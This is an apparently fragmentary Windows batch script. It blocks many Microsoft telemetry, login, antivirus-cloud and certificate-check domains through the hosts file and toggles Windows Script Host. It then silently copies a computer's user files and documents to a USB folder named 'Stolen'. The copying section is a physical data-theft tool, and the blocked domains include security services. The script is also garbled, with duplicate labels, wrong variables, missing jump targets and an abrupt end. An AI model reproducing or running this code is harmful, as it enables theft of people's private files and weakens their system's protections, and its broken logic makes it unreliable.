echo 0.0.0.0 hk2sch130021554.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021618.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021634.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021638.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021646.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021652.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021654.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021657.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021723.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021726.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021727.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021730.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021731.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021754.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021829.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021830.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021833.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021840.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021842.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021851.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021852.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021927.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021928.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021929.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130021958.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130022035.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130022041.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130022049.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2sch130022135.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2wns1.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hk2wns1b.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 hostedocsp.globalsign.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 i1.services.social.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 i1.services.social.microsoft.com.nsatc.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 i-bl6p-cor001.api.p001.1drv.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 i-bl6p-cor002.api.p001.1drv.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 i-bn3p-cor001.api.p001.1drv.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 i-by3p-cor001.api.p001.1drv.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 i-by3p-cor002.api.p001.1drv.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 i-ch1-cor001.api.p001.1drv.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 i-ch1-cor002.api.p001.1drv.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 i-sn2-cor001.api.p001.1drv.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 i-sn2-cor002.api.p001.1drv.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 i-sn3p-cor001.api.p001.1drv.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 i-sn3p-cor002.api.p001.1drv.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 i.s1.social.ms.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ieonlinews.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ieonlinews.trafficmanager.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 in.treasuredata.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 incoming.telemetry.mozilla.org   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 inference.location.live.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 inference.location.livenet.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ipv6.msftncsi.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ipv6.msftncsi.com.edgesuite.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 kv101-prod.do.dsp.mp.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 lb1.www.ms.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 legacy-redirection-neurope-prod-hp.cloudapp.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 licensing.md.mp.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 live.rads.msn.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 location-inference-westus.cloudapp.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 login.live.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 login.live.com.nsatc.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ls2web.redmond.corp.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 m221.absolute.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 m.adnxs.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 m.hotmail.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 mobile.events.data.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 mobile.pipe.aria.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 mobileads.msn.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 modern.watson.data.microsoft.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 mpd.mxptint.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 mscrl.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 msedge.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 msftncsi.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 msnbot-65-52-108-234.search.msn.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 msnbot-65-55-108-23.search.msn.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 msnbot-191-232-139-155.search.msn.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 msnbot-207-46-194-25.search.msn.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 msnbot-207-46-194-33.search.msn.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 msntest.serving-sys.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 nexus.officeapps.live.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 nexusrules.officeapps.live.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ns1.msft.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ns2.msft.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ns3.msft.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ns4.msft.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ns5.msft.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ns6.msft.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 oca.telemetry.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 oca.telemetry.microsoft.com.nsatc.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ocsp.usertrust.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 onecollector.cloudapp.aria.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 onesettings-bn2.metron.live.com.nsatc.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 onesettings-cy2.metron.live.com.nsatc.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 onesettings-db5.metron.live.com.nsatc.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 onesettings-hk2.metron.live.com.nsatc.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 origin.windows.microsoft.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 osiprod-scus-snow-000.cloudapp.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 osiprod-weu-snow-000.cloudapp.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 platform.maps.glbdns2.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 pre.footprintpredict.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 preview.msn.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 prod.configsvc1.live.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 prod.configsvc.live.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 rad.live.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 rad.msn.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 redir.metaservices.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 redir.metaservices.microsoft.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 redir.metaservices.microsoft.com.edgesuite.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 redirection.prod.cms.msn.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 redirection.prod.cms.msn.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 redshell.io   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 register.mesh.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 reports.wes.df.telemetry.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ris.api.iris.microsoft.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 s0.2mdn.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 s.gateway.messenger.live.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 sc.iasds01.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 schemas.microsoft.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 secure.adnxs.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 secure.flashtalking.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 self.events.data.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 services.wes.df.telemetry.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 settings-sandbox.data.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 settings-win-ppe.data.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 settings-win.data.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 settings.data.glbdns2.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 settings.data.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 sg2p.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 siweb.microsoft.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 skyapi.live.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 skyapi.skyprod.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 skydrive.wns.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 sls.update.microsoft.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 sm.mcafee.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 sn3301-c.1drv.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 sn3301-e.1drv.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 sn3301-g.1drv.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 so.2mdn.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 solitaireprod.maelstrom.xboxlive.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 spynet2.microsoft.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 spynet2.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 spynetalt.microsoft.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 spynetalt.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 spyneteurope.microsoft.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 spynetus.microsoft.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 sqm.df.telemetry.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 sqm.telemetry.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 sqm.telemetry.microsoft.com.nsatc.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 sqmfe.glbdns2.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ssw.live.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 ssw.live.com.nsatc.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 static.2mdn.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 statsfe1.ws.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 statsfe2.update.microsoft.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 statsfe2.ws.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 storecatalogrevocation.storequality.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 storeedgefd.dsx.mp.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 su3.mcafee.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 survey.watson.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 sway-cdn.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 t0.ssl.ak.dynamic.tiles.virtualearth.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 t0.ssl.ak.tiles.virtualearth.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 t.urs.microsoft.com.nsatc.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 tele.trafficmanager.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 telecommand.telemetry.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 telecommand.telemetry.microsoft.com.nsatc.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 telemetry.appex.bing.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 telemetry.appex.bing.net:443   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 telemetry.appex.search.prod.ms.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 telemetry.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 telemetry.remoteapp.windowsazure.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 telemetry.urs.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 teredo.ipv6.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 test.activity.windows.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 travel.tile.appex.bing.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 treasuredata.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 tsfe.trafficshaping.dsp.mp.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 tsfe.tsws.mp.microsoft.com.nsatc.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 tunnel.cfw.trustedsource.org   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 umwatsonc.events.data.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 updatekeepalive.mcafee.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 urs.microsoft.com.nsatc.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 us-v10.events.data.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 us-v20.events.data.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 us.vortex-win.data.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 v10-win.vortex.data.microsoft.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 v10.events.data.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 v10.vortex-win.data.metron.life.com.nsatc.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 v10.vortex-win.data.metron.live.com.nsatc.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 v10.vortex-win.data.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 v10c.events.data.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 v20.events.data.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 v20.vortex-win.data.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 version.hybrid.api.here.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 version.prd.us-east-1.ds.data.here.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 view.atdmt.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 vortex-bn2.metron.live.com.nsatc.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 vortex-cy2.metron.live.com.nsatc.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 vortex-db5.metron.live.com.nsatc.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 vortex-hk2.metron.live.com.nsatc.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 vortex-sandbox.data.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 vortex-win-sandbox.data.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 vortex-win.data.metron.live.com.nsatc.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 vortex-win.data.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 vortex.data.glbdns2.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 vortex.data.metron.live.com.nsatc.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 vortex.data.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 vsgallery.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 watson.live.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 watson.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 watson.ppe.telemetry.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 watson.telemetry.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 watson.telemetry.microsoft.com.nsatc.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 watson.telemetry.microsoft.com/Telemetry.Request   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 wdcpus.microsoft.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 web.vortex.data.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 wes.df.telemetry.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 wildcard.appex-rf.msn.com.edgesuite.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 wildcard.twimg.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 win8.ipv6.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 win10.ipv6.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 win10.ipv6.microsoft.com.nsatc.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 win1710.ipv6.microsoft.com   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 wns.notify.windows.com.akadns.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 www.msedge.net   >>"C:\Windows\System32\Drivers\etc\hosts"
echo 0.0.0.0 www.msftncsi.com   >>"C:\Windows\System32\Drivers\etc\hosts"
goto start
:EWSHM
echo This enable and disables Windows Script Host
echo 1) Enable
echo 2) Disable
set/p "EWSHC=>"
if %cho%==1 goto EWSHCE
if %cho%==2 goto EWSHCD
echo Invalid Choice
goto start
:EWSHCD
echo We are disabling Windows Script Access
REG ADD "HKCU\SOFTWARE\Microsoft\Windows Script Host\Settings" /v Enabled /f
REG ADD "HKLM\SOFTWARE\Microsoft\Windows Script Host\Settings" /v Enabled /f

goto start
:EWSHCE
echo We are enabling Windows Script Access
REG DELETE "HKCU\SOFTWARE\Microsoft\Windows Script Host\Settings" /v Enabled /f
REG DELETE "HKLM\SOFTWARE\Microsoft\Windows Script Host\Settings" /v Enabled /f

goto start

:Copy
::User Input
::Ask for the drive letter
set /P ROOT="Enter drive letter of source disc: "
IF NOT '%ROOT%'=='' SET ROOT=%ROOT:~0,1%
set ROOT=%ROOT%:
echo.
::Get the Usb drive letter
set USB=
set /P USB="Enter drive letter of USB flash drive: "
IF NOT '%USB%'=='' SET USB=%USB:~0,1%
set USB=%USB%:
echo.
echo Make a choice
echo 1) Copy From Windows
echo 2) Copy From Drive
set/p "cho=>"
if %cho%==1 goto Windows
if %cho%==2 goto Drive

:Windows
echo.
echo Make a choice
echo 1) Copy All Files
echo 2) Copy Documents
set/p "cho=>"
if %cho%==1 goto Hole
if %cho%==2 goto Docx
echo Invalid choice.
goto start

:Hole
echo Your have choosen to Copy all files from %ROOT% to %USB%
echo please wait
xcopy /q /s /c /i /y "C:\Users\*.*" "%USB%\Stolen"
xcopy /q /s /c /i /y "C:\Documents and Settings\*.*" "%USB%\Stolen"
echo Please wait
echo Thank you for your patience
cls
goto start
:Docx
echo.
echo Your have choosen to Copy Documents from %ROOT% to %USB%
echo please wait
xcopy /q /s /c /i /y "C:\Users\*.doc" "%USB%\Stolen\documents"
xcopy /q /s /c /i /y "C:\Users\*.pdf" "%USB%\Stolen\documents"
xcopy /q /s /c /i /y "C:\Users\*.xls" "%USB%\Stolen\documents"
xcopy /q /s /c /i /y "C:\Users\*.txt" "%USB%\Stolen\documents"
echo Please wait
echo Thank you for your patience
cls
goto start

::Drive
xcopy /q /s /c /i /y "%ROOT%\*.*" "%USB%"

:Drive
echo.
echo Make a choice
echo 1) Copy All Files
echo 2) Copy Documents
echo 3) Copy Music
echo 4) Copy Pictures
echo 5) Copy Videos
set/p "cho=>"
if %cho%==1 goto All
if %cho%==2 goto Document
if %cho%==3 goto Music
if %cho%==4 goto Pictures
echo Invalid choice.
goto start


:Music
echo.
echo Your have choosen to Copy Music files from %ROOT% to %USB%
echo please wait
echo These may require more space
xcopy /q /s /c /i /y "%ROOT%\*.mp3" "%USB%\Stolen"
echo Please wait
echo Thank you for your patience
cls
goto start

:Pictures
echo.
echo Your have choosen to Copy Pictures files from %ROOT% to %USB%
echo please wait
echo These may require more space
xcopy /q /s /c /i /y "%ROOT%\*.bmp" "%USB%\Stolen\Pictures"
xcopy /q /s /c /i /y "%ROOT%\*.gif" "%USB%\Stolen\Pictures"
xcopy /q /s /c /i /y "%ROOT%\*.jpg" "%USB%\Stolen\Pictures"
xcopy /q /s /c /i /y "%ROOT%\*.jpeg" "%USB%\Stolen\Pictures"
xcopy /q /s /c /i /y "%ROOT%\*.png" "%USB%\Stolen\Pictures"
echo Please wait
echo Thank you for your patience
cls
goto start

:Videos
echo.
xcopy /q /s /c /i /y "%ROOT%\*.mp4" "%USB%\Stolen\Pictures"
xcopy /q /s /c /i /y "%ROOT%\*.vob" "%USB%\Stolen\Pictures"
xcopy /q /s /c /i /y "%ROOT%\*.flv" "%USB%\Stolen\Pictures"



:Documents
echo.
echo Your have choosen to Copy Documents from %ROOT% to %USB%
echo please wait
xcopy /q /s /c /i /y "%ROOT%\*.doc" "%USB%\Stolen"
xcopy /q /s /c /i /y "%ROOT%\*.pdf" "%USB%\Stolen"
xcopy /q /s /c /i /y "%ROOT%\*.xls" "%USB%\Stolen"
xcopy /q /s /c /i /y "%ROOT%\*.txt" "%USB%\Stolen"
echo Please wait
echo Thank you for your patience
cls
goto start

:Music
echo.
echo Your have choosen to Copy Music files from %ROOT% to %USB%
echo please wait
echo These may require more space
xcopy /q /s /c /i /y "%ROOT%\*.mp3" "%USB%\Stolen"
echo Please wait
echo Thank you for your patience
cls
goto start

:Pictures
echo.
echo Your have choosen to Copy Pictures files from %ROOT% to %USB%
echo please wait
echo These may require more space
xcopy /q /s /c /i /y "%ROOT%\*.bmp" "%USB%\Stolen\Pictures"
xcopy /q /s /c /i /y "%ROOT%\*.gif" "%USB%\Stolen\Pictures"
xcopy /q /s /c /i /y "%ROOT%\*.jpg" "%USB%\Stolen\Pictures"
xcopy /q /s /c /i /y "%ROOT%\*.jpeg" "%USB%\Stolen\Pictures"
xcopy /q /s /c /i /y "%ROOT%\*.png" "%USB%\Stolen\Pictures"
echo Please wait
echo Thank you for your patience
cls
goto start

:Videos
echo.
xcopy /q /s /c /i /y "%ROOT%\*.mp4" "%USB%\Stolen\Pictures"
xcopy /q /s /c /i /y "%ROOT%\*.vob" "%USB%\Stolen\Pictures"
xcopy /q /s /c /i /y "%ROOT%\*.flv" "%USB%\Stolen\Pictures"

echo Set the drive letters for %username%.
echo.
set /p USB="Usb Drive Letter: "
::IF NOT '%USB'==''SET USB=%USB:~0,1%
SET USB=%USB%
SET /p LOCK="Source Drive: "
::IF NOT '%LOCK'==''SET LOCK=%LOCK:~0,1%
SET LOCK=%LOCK%
echo Do you want to backup or copy
echo 1) Backup
echo 2) Copy
SET /p "cho=>"
if %cho%== 1 goto backup
if %cho%== 2 goto copy
:backup
echo how do you want to backup
echo.
echo 1)Backup to USb
echo 2) Backup to Drive
SET /p "bac=>"
if %bac%== 1 goto backusb
if %bac%== 2 goto backdrive
:backusb
